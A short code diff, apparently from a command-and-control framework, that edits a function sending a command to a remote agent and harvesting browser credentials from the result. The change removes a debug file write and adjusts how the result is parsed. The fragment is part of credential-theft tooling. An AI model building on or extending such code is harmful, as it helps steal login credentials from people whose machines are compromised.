@@ -15,6 +15,5 @@ async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialT
     result = await remote_send_command(conn_id=agent_id, command=command)
     if not result.success:
         raise Exception(result.error)
-    open("/root/darkscryc2/test.json", "w").write(str(result.data))
-    creds = await gather_browser_credentials(result.data)
+    creds = await gather_browser_credentials(result.data["result"])
     return creds.model_dump()
